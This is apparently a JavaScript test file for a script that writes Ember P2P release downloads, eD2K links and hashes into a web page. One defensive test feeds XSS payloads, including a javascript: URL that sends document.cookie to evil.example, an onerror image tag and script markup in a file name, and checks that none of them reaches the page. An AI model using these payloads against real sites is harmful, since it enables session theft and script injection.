import assert from "node:assert/strict";
import { readFileSync } from "node:fs";
import test from "node:test";

import { ed2kLink, releaseDownloadUrl } from "./ed2k-links.mjs";
import {
  checkedDownloads,
  clickableEd2kLink,
  formatSize,
  isOlder,
  offeredVersion,
  releaseAnchor,
  replaceBetween,
  updateWebsite,
} from "./website-downloads.mjs";

const REPOSITORY = "untaimed18/Ember-P2P";

const file = (kind, name, extra = {}) => {
  const entry = {
    kind,
    label: `Label for ${kind}`,
    name,
    size: 19_600_000,
    sha256: "ab".repeat(32),
    ed2k: "00".repeat(16),
    aich: "11".repeat(20),
    ...extra,
  };
  const url = releaseDownloadUrl(REPOSITORY, "v9.9.9", name);
  return { url, link: ed2kLink({ ...entry, webSources: [url] }), ...entry };
};

const DOWNLOADS = {
  version: "9.9.9",
  tag: "v9.9.9",
  installers: [file("windows-installer", "Ember_9.9.9_x64-setup.exe"), file("linux-deb", "Ember_9.9.9_amd64.deb")],
  collection: file("collection", "Ember_9.9.9.emulecollection"),
};

const PAGE = [
  "<!-- release-notice:start -->old notice<!-- release-notice:end -->",
  "<!-- downloads:start -->old downloads<!-- downloads:end -->",
  '<article class="release" id="release-9-9-9"></article>',
].join("\n");

/** What lies between `name`'s markers. */
const block = (html, name) => html.slice(html.indexOf(`<!-- ${name}:start -->`), html.indexOf(`<!-- ${name}:end -->`));

test("the website offers every file with its size, SHA-256, download and eD2K link", () => {
  const html = updateWebsite(PAGE, DOWNLOADS);
  assert.ok(!html.includes("old downloads") && !html.includes("old notice"));
  assert.ok(html.includes("<h2>Download Ember 9.9.9</h2>"));
  for (const entry of [...DOWNLOADS.installers, DOWNLOADS.collection]) {
    assert.ok(html.includes(`href="${entry.url}"`), entry.name);
    assert.ok(html.includes(`href="${clickableEd2kLink(entry.link)}"`), entry.name);
    assert.ok(html.includes(`<code>${entry.link}</code>`), `${entry.name} as text to paste`);
    assert.ok(html.includes(entry.sha256), entry.name);
  }
  assert.ok(!html.includes('href="ed2k://|'), "no link a browser blocks");
  assert.ok(html.includes('href="#release-9-9-9"'), "the notice and the button reach the notes");
  assert.ok(html.includes("Windows 10/11 (64-bit), installer"), "the page's own labels");
  assert.ok(!html.includes("Label for"), "not the list's");
  assert.equal(updateWebsite(html, DOWNLOADS), html, "running it again changes nothing");
});

test("nothing is offered before its notes are written, or into a page without its markers", () => {
  assert.throws(() => updateWebsite(PAGE.replace("release-9-9-9", "release-9-9-8"), DOWNLOADS), /no release notes for 9.9.9/);
  assert.throws(() => updateWebsite(PAGE.replace("<!-- downloads:end -->", ""), DOWNLOADS), /exactly one/);
  assert.throws(() => replaceBetween(`${PAGE}\n<!-- downloads:start --><!-- downloads:end -->`, "downloads", "x"), /exactly one/);
  assert.throws(() => updateWebsite(PAGE, { ...DOWNLOADS, version: "9.9" }), /not a release version/);
});

test("a downloads list that is not the release's own cannot reach the page", () => {
  const hostile = (patch) => () => checkedDownloads({ ...DOWNLOADS, ...patch });
  assert.throws(hostile({ tag: "v9.9.8" }), /for v9.9.8, not v9.9.9/);
  assert.throws(hostile({ version: "9.9.8" }), /for v9.9.9, not v9.9.8/, "a list naming an older release as this one");
  assert.throws(hostile({ installers: [file("windows-installer", 'a"><script>x</script>.exe')] }), /not a file of Ember 9.9.9/);
  assert.throws(hostile({ installers: [file("windows-installer", "Ember_9.9.8_x64-setup.exe")] }), /not a file of Ember 9.9.9/);
  assert.throws(hostile({ installers: [file("windows-installer", "Ember_9.9.9_x64|setup.exe")] }), /not a file/);
  assert.throws(hostile({ installers: [file("windows-installer", "Ember_9.9.9_x64-setup.exe", { size: -1 })] }), /not a size/);
  assert.throws(hostile({ installers: [file("windows-installer", "Ember_9.9.9_x64-setup.exe", { sha256: "x" })] }), /not a SHA-256/);
  assert.throws(hostile({ installers: [file("phone", "Ember_9.9.9_x64-setup.exe")] }), /unknown or repeated kind/);
  assert.throws(hostile({ installers: [DOWNLOADS.installers[0], DOWNLOADS.installers[0]] }), /unknown or repeated kind/);
  assert.throws(hostile({ installers: [] }), /no installers/);

  // What the list says beyond its hashes is never what the page writes.
  const rewritten = {
    ...DOWNLOADS,
    installers: [
      file("windows-installer", "Ember_9.9.9_x64-setup.exe", {
        url: "javascript:fetch('//evil.example/'+document.cookie)",
        link: "javascript:alert(1)",
        label: '<img src=x onerror="alert(1)">',
      }),
    ],
  };
  const downloads = block(updateWebsite(PAGE, rewritten), "downloads");
  assert.ok(!downloads.includes("javascript:"));
  assert.ok(!downloads.includes("<img") && !downloads.includes("&lt;img"));
  assert.ok(downloads.includes(`href="https://github.com/${REPOSITORY}/releases/download/v9.9.9/Ember_9.9.9_x64-setup.exe"`));
});

test("an older release cannot take the page back", () => {
  const page = updateWebsite(PAGE, DOWNLOADS);
  assert.equal(offeredVersion(page), "9.9.9");
  assert.equal(offeredVersion(PAGE), null, "a page offering nothing yet");
  assert.ok(isOlder("9.9.8", "9.9.9") && isOlder("1.7.7", "1.10.0") && isOlder("1.9.9", "2.0.0"));
  assert.ok(!isOlder("9.9.9", "9.9.9") && !isOlder("1.10.0", "1.9.0"), "compared as numbers");
});

test("an eD2K link survives a browser's URL parser and reads back as written", () => {
  const link = DOWNLOADS.installers[0].link;
  assert.throws(() => new URL(link), "a raw link is what browsers block");
  const clickable = clickableEd2kLink(link);
  assert.equal(new URL(clickable).href, clickable, "the browser hands the client the link unchanged");
  assert.ok(!clickable.includes("|"));
  // As eMule's CemuleDlg::ProcessED2KLink reads a clicked link.
  assert.equal(decodeURIComponent(clickable.replaceAll("%7C", "|")), link);
  // A name with a space and a letter outside ASCII, escaped in the link, reads back too.
  const spaced = ed2kLink({ name: "Ember 9.9.9 Grüße.txt", size: 9, ed2k: "00".repeat(16), webSources: [] });
  assert.ok(spaced.includes("Ember%209.9.9%20Gr%C3%BC%C3%9Fe.txt"));
  const clicked = clickableEd2kLink(spaced);
  assert.equal(new URL(clicked).href, clicked);
  assert.equal(clicked.replaceAll("%7C", "|"), spaced, "Ember restores the pipes and keeps the name's escapes");
  // A file named like a web source is still the name.
  const named = "ed2k://|file|s=a.bin|9|00112233445566778899AABBCCDDEEFF|/";
  assert.equal(clickableEd2kLink(named), "ed2k://%7Cfile%7Cs=a.bin%7C9%7C00112233445566778899AABBCCDDEEFF%7C/");
});

test("sizes and anchors read as the page writes them", () => {
  assert.equal(formatSize(19_600_000), "19.6 MB");
  assert.equal(formatSize(4_321), "4 KB");
  assert.equal(releaseAnchor("1.8.0"), "release-1-8-0");
});

test("the live page carries both markers, and a download section a release can rewrite", () => {
  const html = readFileSync(new URL("../docs/index.html", import.meta.url), "utf8");
  for (const name of ["downloads", "release-notice"]) {
    const replaced = block(replaceBetween(html, name, "<!-- replaced -->"), name);
    assert.ok(replaced.includes("<!-- replaced -->"), name);
    assert.ok(!replaced.includes("Download Ember") && !replaced.includes("release-notice-tag"), `${name} holds only what replaced it`);
  }
  assert.match(offeredVersion(html) ?? "", /^\d+\.\d+\.\d+$/, "the page names the version it offers");
});
